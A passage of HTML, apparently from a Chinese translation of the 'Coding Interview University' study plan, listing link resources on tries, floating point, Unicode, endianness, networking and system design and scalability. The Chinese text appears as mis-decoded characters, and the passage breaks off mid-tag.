href="#%E4%B8%80%E4%BA%9B%E4%B8%BB%E9%A2%98%E7%9A%84%E9%A2%9D%E5%A4%96%E5%86%85%E5%AE%B9">ä¸€äº›ä¸»é¢˜çš„é¢å¤–å†…å®¹</a>â€ä¸­çš„â€œå­—ç¬¦ä¸²åŒ¹é…â€éƒ¨åˆ†ã€‚</p><ul><li><h3><span id="zi-dian-shu-tries">å­—å…¸æ ‘ï¼ˆTriesï¼‰</span></h3><ul><li>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå­—å…¸æ ‘å„å¼å„æ ·ã€‚æœ‰äº›æœ‰å‰ç¼€ï¼Œè€Œæœ‰äº›åˆ™æ²¡æœ‰ã€‚æœ‰äº›ä½¿ç”¨å­—ç¬¦ä¸²è€Œä¸ä½¿ç”¨æ¯”ç‰¹ä½æ¥è¿½è¸ªè·¯å¾„ã€‚</li><li>é˜…è¯»ä»£ç ï¼Œä½†ä¸å®ç°ã€‚</li><li><a href="https://www.coursera.org/learn/algorithms-part2/home/week/4">Sedgewickâ”€â”€å­—å…¸æ ‘ï¼ˆ3ä¸ªè§†é¢‘ï¼‰</a><ul><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/CPVdr/r-way-tries">1. R Wayå­—å…¸æ ‘</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/yQM8K/ternary-search-tries">2. ä¸‰å…ƒæœç´¢æ ‘</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/jwNmV/character-based-operations">3. åŸºäºå­—ç¬¦ä¸²çš„æ“ä½œ</a></li></ul></li><li>[ ] <a href="http://www.cs.yale.edu/homes/aspnes/classes/223/notes.html#Tries">æ•°æ®ç»“æ„ç¬”è®°åŠç¼–ç¨‹æŠ€æœ¯</a></li><li>[ ] çŸ­è¯¾ç¨‹è§†é¢‘ï¼š<ul><li>[ ] <a href="https://www.coursera.org/learn/data-structures-optimizing-performance/lecture/08Xyf/core-introduction-to-tries">å¯¹å­—å…¸æ ‘çš„ä»‹ç»ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures-optimizing-performance/lecture/PvlZW/core-performance-of-tries">å­—å…¸æ ‘çš„æ€§èƒ½ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures-optimizing-performance/lecture/DFvd3/core-implementing-a-trie">å®ç°ä¸€æ£µå­—å…¸æ ‘ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li>[ ] <a href="https://www.toptal.com/java/the-trie-a-neglected-data-structure">å­—å…¸æ ‘ï¼šä¸€ä¸ªè¢«å¿½ç•¥çš„æ•°æ®ç»“æ„</a></li><li>[ ] <a href="https://www.topcoder.com/community/data-science/data-science-tutorials/using-tries/">TopCoder â€”â€” ä½¿ç”¨å­—å…¸æ ‘</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=TJ8SkcUSdbU">æ ‡å‡†æ•™ç¨‹ï¼ˆç°å®ä¸­çš„ç”¨ä¾‹ï¼‰ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=NinWEPPrkDQ&amp;index=16&amp;list=PLUl4u3cNGP61hsJNdULdudlRL493b-XZf">MITï¼Œé«˜é˜¶æ•°æ®ç»“æ„ï¼Œå­—ç¬¦ä¸²ï¼ˆè§†é¢‘ä¸­é—´æœ‰ç‚¹å›°éš¾ï¼‰ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li><h3><span id="fu-dian-shu">æµ®ç‚¹æ•°</span></h3><ul><li>[ ] ç®€å•8ä½ï¼š<a href="https://www.youtube.com/watch?v=ji3SfClm8TU">æµ®ç‚¹æ•°çš„è¡¨ç¤ºå½¢å¼-1ï¼ˆè§†é¢‘â”€â”€è®¡ç®—ä¸­å­˜åœ¨é”™è¯¯ï¼Œè¯·å‚è§è§†é¢‘è¯´æ˜ï¼‰</a></li><li>[ ] 32ä½ï¼š<a href="https://www.youtube.com/watch?v=50ZYcZebIec">IEEE754 32ä½æµ®ç‚¹äºŒè¿›åˆ¶ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li><h3><span id="unicode">Unicode</span></h3><ul><li>[ ] <a href="http://www.joelonsoftware.com/articles/Unicode.html">æ¯ä¸€ä¸ªè½¯ä»¶å¼€å‘è€…çš„ç»å¯¹æœ€ä½é™åº¦ï¼Œå¿…é¡»è¦çŸ¥é“çš„å…³äº Unicode å’Œå­—ç¬¦é›†çŸ¥è¯†</a></li><li>[ ] <a href="http://kunststube.net/encoding/">å…³äºå¤„ç†æ–‡æœ¬éœ€è¦çš„ç¼–ç å’Œå­—ç¬¦é›†ï¼Œæ¯ä¸ªç¨‹åºå‘˜ç»å¯¹éœ€è¦çŸ¥é“çš„çŸ¥è¯†</a></li></ul></li><li><h3><span id="zi-jie-xu-endianness">å­—èŠ‚åºï¼ˆEndiannessï¼‰</span></h3><ul><li><a href="https://web.archive.org/web/20180107141940/http://www.cs.umd.edu:80/class/sum2003/cmsc311/Notes/Data/endian.html">å¤§/å°ç«¯åº</a></li><li><a href="https://www.youtube.com/watch?v=JrNF0KRAlyo">å¤§ç«¯åº Vs å°ç«¯åºï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=oBSuXP-1Tc0">ç”±é‡Œå…¥å†…çš„å¤§ç«¯åºä¸å°ç«¯åºï¼ˆè§†é¢‘ï¼‰</a><ul><li>å¯¹äºå†…æ ¸å¼€å‘éå¸¸å…·æœ‰æŠ€æœ¯æ€§ï¼Œå¦‚æœå¤§å¤šæ•°çš„å†…å®¹å¬ä¸æ‡‚ä¹Ÿæ²¡å…³ç³»ã€‚</li><li>å‰åŠéƒ¨å°±å·²ç»è¶³å¤Ÿäº†ã€‚</li></ul></li></ul></li><li><h3><span id="wang-luo-shi-pin">ç½‘ç»œï¼ˆè§†é¢‘ï¼‰</span></h3><ul><li><strong>å¦‚æœä½ å…·æœ‰ç½‘ç»œç»éªŒæˆ–æƒ³æˆä¸ºå¯é æ€§å·¥ç¨‹å¸ˆæˆ–è¿ç»´å·¥ç¨‹å¸ˆï¼ŒæœŸå¾…ä½ çš„é—®é¢˜</strong></li><li>çŸ¥é“è¿™äº›æœ‰ç›Šæ— å®³ï¼Œå¤šå¤šç›Šå–„!</li><li>[ ] <a href="https://www.khanacademy.org/computing/computer-science/computers-and-internet-code-org">å¯æ±—å­¦é™¢</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=Vdc8TCESIg8">UDP å’Œ TCPï¼šç½‘ç»œä¼ è¾“åè®®ä¸­çš„æ•°æ®å‹ç¼©ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=e5DEVa9eSN0">TCP/IP å’Œ OSI æ¨¡å‹è§£é‡Šï¼ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=nomyRJehhnM">äº’è”ç½‘ä¸Šçš„æ•°æ®åŒ…ä¼ è¾“ã€‚ç½‘ç»œå’Œ TCP/IP æ•™ç¨‹ã€‚ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=WGJrLqtX7As">HTTPï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=S2iBR2ZlZf0">SSL å’Œ HTTPSï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=Rp3iZUvXWlM">SSL/TLSï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=E9FxNzv1Tr8">HTTP 2.0ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/playlist?list=PLEbnTDJUr_IegfoqO4iPnPYQui46QqT0j">è§†é¢‘ç³»åˆ—ï¼ˆ21ä¸ªè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=t5xYI0jzOf4">å­ç½‘ç»œè§£å¯† - ç¬¬äº”éƒ¨åˆ† ç»å…¸å†…éƒ¨åŸŸåæŒ‡å‘ CIDR æ ‡è®°ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] å¥—æ¥å­—ï¼ˆSocketsï¼‰ï¼š<ul><li><a href="https://www.youtube.com/watch?v=6G_W54zuadg&amp;t=6s">Javaâ”€â”€å¥—æ¥å­—â”€â”€ä»‹ç»ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=G75vN2mnJeQ">å¥—æ¥å­—ç¼–ç¨‹ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li></ul></li></ul><h2><span id="xi-tong-she-ji-ke-shen-suo-xing-shu-ju-chu-li">ç³»ç»Ÿè®¾è®¡ã€å¯ä¼¸ç¼©æ€§ã€æ•°æ®å¤„ç†</span></h2><p><strong>å¦‚æœä½ å·²ç»æ‹¥æœ‰äº†4å¹´ä»¥ä¸Šçš„ç¼–ç¨‹ç»éªŒï¼Œé‚£ä½ å¯ä»¥æ¥çœ‹çœ‹æœ‰å…³ç³»ç»Ÿè®¾è®¡çš„é—®é¢˜</strong></p><ul><li>ç³»ç»Ÿè®¾è®¡ä»¥åŠå¯ä¼¸ç¼©æ€§ï¼Œè¦æŠŠè½¯ç¡¬ä»¶çš„ä¼¸ç¼©æ€§è®¾è®¡çš„è¶³å¤Ÿå¥½æœ‰å¾ˆå¤šçš„ä¸œè¥¿è¦è€ƒè™‘ï¼Œæ‰€ä»¥è¿™æ˜¯ä¸ªåŒ…å«éå¸¸å¤šå†…å®¹å’Œèµ„æºçš„å¤§ä¸»é¢˜ã€‚è¦èŠ±è´¹ç›¸å½“å¤šçš„æ—¶é—´åœ¨è¿™ä¸ªä¸»é¢˜ä¸Šã€‚</li><li>è€ƒé‡ï¼š<ul><li>ä¼¸ç¼©æ€§<ul><li>æŠŠå¤§æ•°æ®é›†æå–ä¸ºå•ä¸€å€¼</li><li>å¤§æ•°æ®é›†è½¬æ¢</li><li>å¤„ç†å¤§é‡çš„æ•°æ®é›†</li></ul></li><li>ç³»ç»Ÿ<ul><li>åŠŸèƒ½é›†</li><li>æ¥å£</li><li>ç±»å±‚æ¬¡ç»“æ„</li><li>åœ¨ç‰¹å®šçš„çº¦æŸä¸‹è®¾è®¡ç³»ç»Ÿ</li><li>è½»é‡å’Œå¥å£®æ€§</li><li>æƒè¡¡å’ŒæŠ˜è¡·</li><li>æ€§èƒ½åˆ†æå’Œä¼˜åŒ–</li></ul></li></ul></li><li>[ ] <strong>ä»è¿™é‡Œå¼€å§‹</strong>ï¼š<a href="https://github.com/donnemartin/system-design-primer">ç³»ç»Ÿè®¾è®¡å…¥é—¨</a></li><li>[ ] <a href="http://www.hiredintech.com/system-design/">HiredInTechï¼šç³»ç»Ÿè®¾è®¡</a></li><li>[ ] <a href="https://www.quora.comHow-do-I-prepare-to-answer-design-questions-in-a-technical-interview?redirected_qid=1500023">è¯¥å¦‚ä½•ä¸ºæŠ€æœ¯é¢è¯•é‡Œè®¾è®¡æ–¹é¢çš„é—®é¢˜åšå‡†å¤‡?</a></li><li>[ ] <a href="http://blog.gainlo.co/index.php/2015/10/228-things-you-need-to-know-before-system-design-interviews/">åœ¨ç³»ç»Ÿè®¾è®¡é¢è¯•å‰å¿…é¡»çŸ¥é“çš„ 8 ä»¶äº‹</a></li><li>[ ] <a href="http://www.hiredintech.com/algorithm-design/">ç®—æ³•è®¾è®¡</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=UrYLYV7WSHM">æ•°æ®åº“èŒƒå¼ - 1NF, 2NF, 3NF and 4NFï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://github.com/checkcheckzz/system-design-interview">ç³»ç»Ÿè®¾è®¡é¢è¯•</a> - è¿™ä¸€éƒ¨åˆ†æœ‰å¾ˆå¤šçš„èµ„æºæµè§ˆä¸€ä¸‹æˆ‘æ”¾åœ¨ä¸‹é¢çš„æ–‡ç« å’Œä¾‹å­ã€‚</li><li>[ ] <a href="http://www.palantir.com/2011/10how-to-rock-a-systems-design-interview/">å¦‚ä½•åœ¨ç³»ç»Ÿè®¾è®¡é¢è¯•ä¸­è„±é¢–è€Œå‡º</a></li><li>[ ] <a href="http://everythingisdata.wordpress.com/2009/10/17numbers-everyone-should-know/">æ¯ä¸ªäººéƒ½è¯¥çŸ¥é“çš„ä¸€äº›æ•°å­—</a></li><li>[ ] <a href="http://blog.tsunanet.net/2010/11how-long-does-it-take-to-make-context.html">ä¸Šä¸‹æ–‡åˆ‡æ¢æ“ä½œä¼šè€—è´¹å¤šå°‘æ—¶é—´?</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=srOgpXECblk">è·¨æ•°æ®ä¸­å¿ƒçš„äº‹åŠ¡ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="http://ksat.me/a-plain-english-introduction-to-cap-theorem/">ç®€æ˜ CAP ç†è®ºä»‹ç»</a></li><li>[ ] å…±è¯†ç®—æ³•ï¼š<ul><li>[ ] Paxosï¼š<a href="https://www.youtube.com/watch?v=s8JqcZtvnsM">Paxosåè®®â”€â”€Computerphileï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] Raft: <a href="https://www.youtube.com/watch?v=P9Ydif5_qvE">Raft åˆ†å¸ƒå¼å…±è¯†ç®—æ³•ç®€ä»‹ï¼ˆè§†é¢‘ï¼‰</a><ul><li>[ ] <a href="https://raft.github.io/">æ˜“äºé˜…è¯»çš„è®ºæ–‡</a></li><li>[ ] [ä¿¡æ¯å›¾]</li></ul></li></ul></li><li>[ ] <a href="http://www.tom-e-white.com/2007/11/consistent-hashing.html">ä¸€è‡´æ€§å“ˆå¸Œ</a></li><li>[ ] <a href="http://horicky.blogspot.com/2009/11/nosql-patterns.html">NoSQL æ¨¡å¼</a></li><li>[ ] å¯ä¼¸ç¼©æ€§:<ul><li>ä½ ä¸éœ€è¦çŸ¥é“æ‰€æœ‰è¿™äº›ã€‚åªéœ€æŒ‘é€‰ä¸€äº›ä½ æ„Ÿå…´è¶£çš„ä¸œè¥¿å³å¯ã€‚</li><li>[ ] <a href="https://www.youtube.com/watch?v=-W9F__D3oY4">å¾ˆæ£’çš„æ¦‚è¿°ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] ç®€çŸ­ç³»åˆ—:<ul><li><a href="http://www.lecloud.net/post/7295452622/scalability-for-dummies-part-1-clones">å…‹éš†</a></li><li><a href="http://www.lecloud.net/post/7994751381/scalability-for-dummies-part-2-database">æ•°æ®åº“</a></li><li><a href="http://www.lecloud.net/post/9246290032/scalability-for-dummies-part-3-cache">ç¼“å­˜</a></li><li><a href="http://www.lecloud.net/post/9699762917/scalability-for-dummies-part-4-asynchronism">å¼‚æ­¥</a></li></ul></li><li>[ ] <a href="http://www.aosabook.org/en/distsys.html">å¯ä¼¸ç¼©çš„ Web æ¶æ„å’Œåˆ†å¸ƒå¼ç³»ç»Ÿ</a></li><li>[ ] <a href="https://pages.cs.wisc.edu/~zuyu/files/fallacies.pdf">é”™è¯¯çš„åˆ†å¸ƒå¼ç³»ç»Ÿè§£é‡Š</a></li><li>[ ] <a href="http://horicky.blogspot.com/2010/10/scalable-system-design-patterns.html">å®ç”¨ç¼–ç¨‹æŠ€æœ¯</a><ul><li><a href="http://horicky.blogspot.com/2010/07/google-pregel-graph-processing.html">extra: Google Pregel å›¾å½¢å¤„ç†</a></li></ul></li><li>[ ] <a href="https://www.youtube.com/watch?v=modXC5IWTJI">Jeff Dean - åœ¨ Goolge æ„å»ºè½¯ä»¶ç³»ç»Ÿï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="http://lethain.com/introduction-to-architecting-systems-for-scale/">å¯ä¼¸ç¼©ç³»ç»Ÿæ¶æ„è®¾è®¡ä»‹ç»</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=9nWyWwY2Onc">ä½¿ç”¨ App Engine å’Œäº‘å­˜å‚¨æ‰©å±•é¢å‘å…¨çƒç”¨æˆ·çš„æ‰‹æœºæ¸¸æˆæ¶æ„å®è·µï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=H4vMcD7zKM0">How Google Does Planet-Scale Engineering for Planet-Scale Infraï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.topcoder.com/community/data-science/data-science-tutorials/the-importance-of-algorithms/">ç®—æ³•çš„é‡è¦æ€§</a></li><li>[ ] <a href="http://highscalability.com/blog/2009/8/6/an-unorthodox-approach-to-database-design-the-coming-of-the.html">åˆ†ç‰‡ï¼ˆShardingï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=oodS71YtkGU">Facebook ç³»ç»Ÿè§„æ¨¡æ‰©å±•å®è·µ (2012), â€œä¸º 10 äº¿ç”¨æˆ·æ„å»ºâ€ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=p0jGmgIrf_M&amp;list=PLRXxvay_m8gqVlExPC5DG3TGWJTaBgqSA&amp;index=4">Long Game å·¥ç¨‹å®è·µ - Astrid Atkinson Keynoteï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="http://highscalability.com/blog/2012/3/26/7-years-of-youtube-scalability-lessons-in-30-minutes.html">30 åˆ†é’Ÿçœ‹å®Œ YouTuBe 7 å¹´ç³»ç»Ÿæ‰©å±•ç»éªŒ</a><ul><li><a href="https://www.youtube.com/watch?v=G-lGCC4KKok">è§†é¢‘</a></li></ul></li><li>[ ] <a href="http://highscalability.com/blog/2016/8/15/how-paypal-scaled-to-billions-of-transactions-daily-using-ju.html">PayPal å¦‚ä½•ç”¨ 8 å°è™šæ‹Ÿæœºæ‰›ä½ 10 äº¿æ—¥äº¤æ˜“é‡ç³»ç»Ÿ</a></li><li>[ ] <a href="https://blog.clevertap.com/how-to-remove-duplicates-in-large-datasets/">å¦‚ä½•å¯¹å¤§æ•°æ®é›†å»é‡</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=3vV4YiqKm1o">Etsy çš„æ‰©å±•å’Œå·¥ç¨‹æ–‡åŒ–æ¢ç©¶ Jon Cowieï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="http://thenewstack.io/led-amazon-microservices-architecture/">æ˜¯ä»€ä¹ˆé€ å°±äº† Amazon è‡ªå·±çš„å¾®æœåŠ¡æ¶æ„</a></li><li>[ ] <a href="https://eng.uber.com/trip-data-squeeze/">å‹ç¼©è¿˜æ˜¯ä¸å‹ç¼©ï¼Œæ˜¯ Uber é¢ä¸´çš„é—®é¢˜</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/3/3/asyncio-tarantool-queue-get-in-the-queue.html">å¼‚æ­¥ I/O Tarantool é˜Ÿåˆ—</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/2/25/when-should-approximate-query-processing-be-used.html">ä»€ä¹ˆæ—¶å€™åº”è¯¥ç”¨è¿‘ä¼¼æŸ¥è¯¢å¤„ç†?</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/2/23/googles-transition-from-single-datacenter-to-failover-to-a-n.html">Google ä»å•æ•°æ®ä¸­å¿ƒåˆ°æ•…éšœè½¬ç§», åˆ°æœ¬åœ°å¤šå®¿ä¸»æ¶æ„çš„æ¼”å˜</a></li><li>[ ] <a href="http://highscalability.com/blog/2012/9/24/google-spanners-most-surprising-revelation-nosql-is-out-and.html">Spanner</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/2/15/egnyte-architecture-lessons-learned-in-building-and-scaling.html">Egnyte: æ„å»ºå’Œæ‰©å±• PB çº§åˆ†å¸ƒå¼ç³»ç»Ÿæ¶æ„çš„ç»éªŒæ•™è®­</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/7/6/machine-learning-driven-programming-a-new-programming-for-a.html">æœºå™¨å­¦ä¹ é©±åŠ¨çš„ç¼–ç¨‹: æ–°ä¸–ç•Œçš„æ–°ç¼–ç¨‹æ–¹å¼</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/6/15/the-image-optimization-technology-that-serves-millions-of-re.html">æ—¥æœåŠ¡æ•°ç™¾ä¸‡è¯·æ±‚çš„å›¾åƒä¼˜åŒ–æŠ€æœ¯</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/2/1/a-patreon-architecture-short.html">Patreon æ¶æ„</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/1/27/tinder-how-does-one-of-the-largest-recommendation-engines-de.html">Tinder: æ¨èå¼•æ“æ˜¯å¦‚ä½•å†³å®šä¸‹ä¸€ä¸ªä½ å°†ä¼šçœ‹åˆ°è°çš„?</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/1/25/design-of-a-modern-cache.html">ç°ä»£ç¼“å­˜è®¾è®¡</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/1/13/live-video-streaming-at-facebook-scale.html">Facebook å®æ—¶è§†é¢‘æµæ‰©å±•</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/1/11/a-beginners-guide-to-scaling-to-11-million-users-on-amazons.html">åœ¨ Amazon AWS ä¸ŠæŠŠæœåŠ¡æ‰©å±•åˆ° 1100 ä¸‡é‡çº§çš„æ–°æ‰‹æ•™ç¨‹</a></li><li>[ ] <a href="http://highscalability.com/blog/2015/12/16/how-does-the-use-of-docker-effect-latency.html">å¯¹å»¶æ—¶æ•æ„Ÿçš„åº”ç”¨æ˜¯å¦åº”è¯¥ä½¿ç”¨ Docker?</a></li><li>[ ] <a href="http://highscalability.com/blog/2015/11/9/a-360-degree-view-of-the-entire-netflix-stack.html">360 åº¦è§£è¯» Netflix æŠ€æœ¯æ ˆ</a></li><li>[ ] <a href="http://highscalability.com/latency-everywhere-and-it-costs-you-sales-how-crush-it">å»¶è¿Ÿæ— å¤„ä¸åœ¨ - å¦‚ä½•æå®šå®ƒï¼Ÿ</a></li><li>[ ] <a href="http://martinfowler.com/articles/serverless.html">æ— æœåŠ¡å™¨æ¶æ„</a></li><li>[ ] <a href="http://instagram-engineering.tumblr.com/post/13649370142/what-powers-instagram-hundreds-of-instances">æ˜¯ä»€ä¹ˆé©±åŠ¨ç€ Instagram: ä¸Šç™¾ä¸ªå®ä¾‹ã€å‡ åç§æŠ€æœ¯</a></li><li>[ ] <a href="http://highscalability.com/blog/2012/7/16/cinchcast-architecture-producing-1500-hours-of-audio-every-d.html">Cinchcast æ¶æ„ - æ¯å¤©å¤„ç† 1500 å°æ—¶çš„éŸ³é¢‘</a></li><li>[ ] <a href="http://highscalability.com/blog/2010/3/16/justintvs-live-video-broadcasting-architecture.html">Justin.Tv å®æ—¶è§†é¢‘æ’­æ”¾æ¶æ„</a></li><li>[ ] <a href="http://highscalability.com/blog/2010/9/21/playfishs-social-gaming-architecture-50-million-monthly-user.html">Playfishâ€™s ç¤¾äº¤æ¸¸æˆæ¶æ„ - æ¯æœˆäº”åƒä¸‡ç”¨æˆ·å¢é•¿</a></li><li>[ ] <a href="http://highscalability.com/blog/2011/6/27/tripadvisor-architecture-40m-visitors-200m-dynamic-page-view.html">çŒ«é€”é¹°æ¶æ„ - 40 ä¸‡è®¿å®¢, 200 ä¸‡åŠ¨æ€é¡µé¢è®¿é—®, 30TB æ•°æ®</a></li><li>[ ] <a href="http://highscalability.com/plentyoffish-architecture">PlentyOfFish æ¶æ„</a></li><li>[ ] <a href="http://highscalability.com/blog/2013/9/23/salesforce-architecture-how-they-handle-13-billion-transacti.html">Salesforce æ¶æ„ - å¦‚ä½•æ‰›ä½ 13 äº¿æ—¥äº¤æ˜“é‡</a></li><li>[ ] <a href="http://highscalability.com/blog/2013/11/4/espns-architecture-at-scale-operating-at-100000-duh-nuh-nuhs.html">ESPNâ€™s æ¶æ„æ‰©å±•</a></li><li>[ ] ä¸‹é¢â€œæ¶ˆæ¯ä¼ é€’ï¼Œåºåˆ—åŒ–å’Œé˜Ÿåˆ—ç³»ç»Ÿâ€éƒ¨åˆ†çš„å†…å®¹ä¼šæåˆ°ä»€ä¹ˆæ ·çš„æŠ€æœ¯èƒ½æŠŠå„ç§æœåŠ¡æ•´åˆåˆ°ä¸€èµ·</li><li>[ ] Twitter:<ul><li><a href="https://www.youtube.com/watch?v=5cKTP36HVgI">Oâ€™Reilly MySQL CE 2011: Jeremy Cole, â€œBig and Small Data at @Twitterâ€ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.infoq.com/presentations/Twitter-Timeline-Scalability">æ—¶é—´çº¿çš„æ‰©å±•</a></li></ul></li><li>æ›´å¤šå†…å®¹å¯ä»¥æŸ¥çœ‹<a href="#%E8%A7%86%E9%A2%91%E7%B3%BB%E5%88%97">è§†é¢‘ç³»åˆ—éƒ¨åˆ†</a>çš„â€œå¤§è§„æ¨¡æ•°æ®æŒ–æ˜â€è§†é¢‘ç³»åˆ—ã€‚</li></ul></li><li>[ ] ç³»ç»Ÿè®¾è®¡é—®é¢˜ç»ƒä¹ ï¼šä¸‹é¢æœ‰ä¸€äº›æŒ‡å¯¼åŸåˆ™ï¼Œæ¯ä¸€ä¸ªéƒ½æœ‰ç›¸å…³æ–‡æ¡£ä»¥åŠåœ¨ç°å®ä¸­è¯¥å¦‚ä½•å¤„ç†ã€‚<ul><li>å¤ä¹ : <a href="https://github.com/donnemartin/system-design-primer">ç³»ç»Ÿè®¾è®¡å…¥é—¨</a></li><li><a href="http://www.hiredintech.com/system-design/">HiredInTech çš„ç³»ç»Ÿè®¾è®¡</a></li><li><a href="https://github.com/jwasham/coding-interview-university/blob/master/extras/cheat%20sheets/system-design.pdf">å¤‡å¿˜å•</a></li><li>æµç¨‹:<ol><li>ç†è§£é—®é¢˜å’ŒèŒƒå›´:<ul><li>åœ¨é¢è¯•å®˜çš„å¸®åŠ©ä¸‹å®šä¹‰ç”¨ä¾‹</li><li>æå‡ºé™„åŠ åŠŸèƒ½çš„å»ºè®®</li><li>å»æ‰é¢è¯•å®˜è®¤å®šèŒƒå›´ä»¥å¤–çš„å†…å®¹</li><li>å‡å®šé«˜å¯ç”¨æ˜¯å¿…é¡»çš„ï¼Œè€Œä¸”è¦ä½œä¸ºä¸€ä¸ªç”¨ä¾‹</li></ul></li><li>è€ƒè™‘çº¦æŸ:<ul><li>é—®ä¸€ä¸‹æ¯æœˆè¯·æ±‚é‡</li><li>é—®ä¸€ä¸‹æ¯ç§’è¯·æ±‚é‡ (ä»–ä»¬å¯èƒ½ä¼šä¸»åŠ¨æåˆ°æˆ–è€…è®©ä½ ç®—ä¸€ä¸‹)</li><li>è¯„ä¼°è¯»å†™æ‰€å çš„ç™¾åˆ†æ¯”</li><li>è¯„ä¼°çš„æ—¶å€™ç‰¢è®° 2/8 åŸåˆ™</li><li>æ¯ç§’å†™å¤šå°‘æ•°æ®</li><li>æ€»çš„æ•°æ®å­˜å‚¨é‡è¦è€ƒè™‘è¶…è¿‡ 5 å¹´çš„æƒ…å†µ</li><li>æ¯ç§’è¯»å¤šå°‘æ•°æ®</li></ul></li><li>æŠ½è±¡è®¾è®¡:<ul><li>åˆ†å±‚ (æœåŠ¡, æ•°æ®, ç¼“å­˜)</li><li>åŸºç¡€è®¾æ–½: è´Ÿè½½å‡è¡¡, æ¶ˆæ¯</li><li>ç²—ç•¥çš„æ¦‚æ‹¬ä»»ä½•é©±åŠ¨æ•´ä¸ªæœåŠ¡çš„å…³é”®ç®—æ³•</li><li>è€ƒè™‘ç“¶é¢ˆå¹¶æŒ‡å‡ºè§£å†³æ–¹æ¡ˆ</li></ul></li></ol></li><li>ç»ƒä¹ :<ul><li><a href="http://repository.cmu.edu/cgi/viewcontent.cgi?article=2112&amp;context=compsci">è®¾è®¡ä¸€ä¸ª CDN ç½‘ç»œ</a></li><li><a href="https://blog.twitter.com/2010/announcing-snowflake">è®¾è®¡ä¸€ä¸ªéšæœºå”¯ä¸€ ID ç”Ÿæˆç³»ç»Ÿ</a></li><li><a href="http://www.indieflashblog.com/how-to-create-an-asynchronous-multiplayer-game.html">è®¾è®¡ä¸€ä¸ªåœ¨çº¿å¤šäººå¡ç‰Œæ¸¸æˆ</a></li><li><a href="http://www.slideshare.net/dvirsky/introduction-to-redis">è®¾è®¡ä¸€ä¸ªé”®å€¼æ•°æ®åº“</a></li><li><a href="http://highscalability.com/blog/2011/12/6/instagram-architecture-14-million-users-terabytes-of-photos.html">è®¾è®¡ä¸€ä¸ªå›¾ç‰‡åˆ†äº«ç³»ç»Ÿ</a></li><li><a href="http://ijcai13.org/files/tutorial_slides/td3.pdf">è®¾è®¡ä¸€ä¸ªæ¨èç³»ç»Ÿ</a></li><li><a href="http://www.hiredintech.com/system-design/the-system-design-process/">è®¾è®¡ä¸€ä¸ªçŸ­åŸŸåç”Ÿæˆç³»ç»Ÿ</a></li><li><a href="https://www.adayinthelifeof.nl/2011/02/06/memcache-internals/">è®¾è®¡ä¸€ä¸ªç¼“å­˜ç³»ç»Ÿ</a></li></ul></li></ul></li></ul><hr><h2><span id="zhong-mian">ç»ˆé¢</span></h2><pre><code>è¿™ä¸€éƒ¨åˆ†æœ‰ä¸€äº›çŸ­è§†é¢‘ï¼Œä½ å¯ä»¥å¿«é€Ÿçš„è§‚çœ‹å’Œå¤ä¹ å¤§å¤šæ•°é‡è¦æ¦‚å¿µã€‚è¿™å¯¹ç»å¸¸æ€§çš„å·©å›ºå¾ˆæœ‰å¸®åŠ©ã€‚</code></pre><ul><li>[ ] 2-3åˆ†é’Ÿçš„ç®€çŸ­ä¸»é¢˜è§†é¢‘ç³»åˆ—ï¼ˆ23ä¸ªè§†é¢‘ï¼‰<ul><li><a 